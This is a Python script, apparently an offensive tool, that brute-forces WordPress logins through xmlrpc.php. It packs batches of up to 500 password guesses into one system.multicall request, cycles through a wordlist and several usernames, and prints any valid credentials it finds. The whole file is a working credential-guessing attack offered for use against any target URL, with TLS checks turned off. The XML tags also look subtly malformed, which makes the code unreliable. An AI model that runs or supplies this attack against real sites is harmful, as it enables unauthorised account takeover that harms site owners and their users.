import time
import requests
import sys
import urllib3
import re
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def log_to_file(message, filename='brute_logs.txt', debug_logs=True):
    if debug_logs:
        with open(filename, 'a', encoding="utf-8") as file:
            file.write(message + '\n')


def clear_log_file(filename='brute_logs.txt'):
    with open(filename, 'w') as file:
        file.truncate()


def send_request(url, data, headers=None, debug_logs=True, log_file='brute_logs.txt'):
    if headers is None:
        headers = {'Content-Type': 'application/xml'}
    try:
        response = requests.post(
            f"{url}/xmlrpc.php", data=data, headers=headers, timeout=10, verify=False)
        if debug_logs:
            log_to_file(
                f"Request URL: {url}\nRequest Data: {data}\nResponse: {response.text}", log_file, debug_logs)
        return response.text
    except requests.exceptions.RequestException as e:
        error_msg = f"[ERROR] Request failed: {e}"
        if debug_logs:
            log_to_file(error_msg, log_file, debug_logs)
        print(bcolors.FAIL + error_msg + bcolors.ENDC)
        return None


def check_response(content):
    if content is None:
        return False
    error_pattern = re.compile(r'<int>(-32700|400|403|405)</int>')
    return error_pattern.search(content) is None


def create_payload(user, passwords):
    xml = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    for passwd in passwords:
        xml += f"""
        <value>
          <struct>
            <member><n>methodName</n><value><string>wp.getCategories</string></value></member>
            <member><n>params</n>
              <value><array><data>
                <value><string>{user}</string></value>
                <value><string>{passwd}</string></value>
              </data></array></value>
            </member>
          </struct>
        </value>
        """
    xml += '</data></array></value></param></params></methodCall>'
    return xml


def brute_force(url, user, passwords, total_tested, total_passwords, headers=None, batch_size=500, wait_time=1, debug_logs=True, log_file='brute_logs.txt'):
    total = len(passwords)
    tested = 0
    batch = []

    for passwd in passwords:
        batch.append(passwd)
        tested += 1
        total_tested += 1

        if len(batch) == batch_size:
            response = send_request(url, create_payload(
                user, batch), headers, debug_logs, log_file)
            last_attempt = batch[-1]
            last_attempt_status = "SUCCESS" if check_response(
                response) else "FAILED"
            print(bcolors.OKBLUE +
                  f"[*] Tested {total_tested}/{total_passwords} passwords. Last attempt: {last_attempt} -> {last_attempt_status}" + bcolors.ENDC)

            if response and check_response(response):
                print(
                    bcolors.WARNING + "[!] Possible valid credentials found! Checking individually..." + bcolors.ENDC)
                for p in batch:
                    single_response = send_request(
                        url, create_payload(user, [p]), headers, debug_logs, log_file)
                    if check_response(single_response):
                        # False positives may occur if response content is unexpected/unhandled
                        print(
                            bcolors.OKGREEN + f"[+] SUCCESS! Valid credentials: {user}/{p}" + bcolors.ENDC)
                        return total_tested, True

            batch = []
            time.sleep(wait_time)

    if batch:
        response = send_request(url, create_payload(
            user, batch), headers, debug_logs, log_file)
        last_attempt = batch[-1]
        last_attempt_status = "SUCCESS" if check_response(
            response) else "FAILED"
        print(bcolors.OKBLUE +
              f"[*] Final batch tested. Last attempt: {last_attempt} -> {last_attempt_status}" + bcolors.ENDC)

        if response and check_response(response):
            print(bcolors.WARNING +
                  "[!] Possible valid credentials found! Checking individually..." + bcolors.ENDC)
            for p in batch:
                single_response = send_request(
                    url, create_payload(user, [p]), headers, debug_logs, log_file)
                if check_response(single_response):
                    print(
                        bcolors.OKGREEN + f"[+] SUCCESS! Valid credentials: {user}/{p}" + bcolors.ENDC)
                    return total_tested, True

    return total_tested, False


def read_passwords_in_chunks(file, batch_size=500):
    with open(file, 'r', encoding='latin-1') as f:
        chunk = []
        for line in f:
            chunk.append(line.strip())
            if len(chunk) == batch_size:
                yield chunk
                chunk = []
        if chunk:
            yield chunk


def count_total_passwords(file):
    with open(file, 'r', encoding='latin-1') as f:
        return sum(1 for _ in f)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='WordPress XML-RPC Password Brute Force')
    parser.add_argument('url', help='Target WordPress URL')
    parser.add_argument('password_file', help='Password wordlist file')
    parser.add_argument('usernames', nargs='+', help='Usernames to test')
    parser.add_argument('--header', '-H', action='append', dest='headers',
                        help='Custom HTTP headers (format: "Key: Value")')
    parser.add_argument('--batch-size', type=int, default=500,
                        help='Passwords per batch (for both file reading and requests) (default: 500)')
    parser.add_argument('--wait-time', type=float, default=1.0,
                        help='Wait time between requests in seconds (default: 1.0)')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug logging')
    parser.add_argument('--log-file', default='brute_logs.txt',
                        help='Log file path (default: brute_logs.txt)')

    args = parser.parse_args()

    start_time = time.time()

    # Parse custom headers
    custom_headers = {'Content-Type': 'application/xml'}
    if args.headers:
        for header in args.headers:
            if ':' in header:
                key, value = header.split(':', 1)
                custom_headers[key.strip()] = value.strip()
            else:
                print(
                    f"Warning: Invalid header format '{header}'. Use 'Key: Value'")

    if args.debug:
        clear_log_file(args.log_file)

    total_tested = 0
    total_passwords = count_total_passwords(args.password_file)
    success = False

    for username in args.usernames:
        if success:
            break
        print(bcolors.OKBLUE + f"[*] Testing user: {username}" + bcolors.ENDC)
        for passwords_chunk in read_passwords_in_chunks(args.password_file, args.batch_size):
            total_tested, success = brute_force(
                args.url, username, passwords_chunk, total_tested, total_passwords,
                custom_headers, args.batch_size, args.wait_time, args.debug, args.log_file)
            if success:
                break

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(bcolors.OKBLUE +
          f"\n[*] Total execution time: {elapsed_time:.2f} seconds" + bcolors.ENDC)
    print(bcolors.OKBLUE +
          f"[*] Total passwords tested: {total_tested}/{total_passwords}" + bcolors.ENDC)
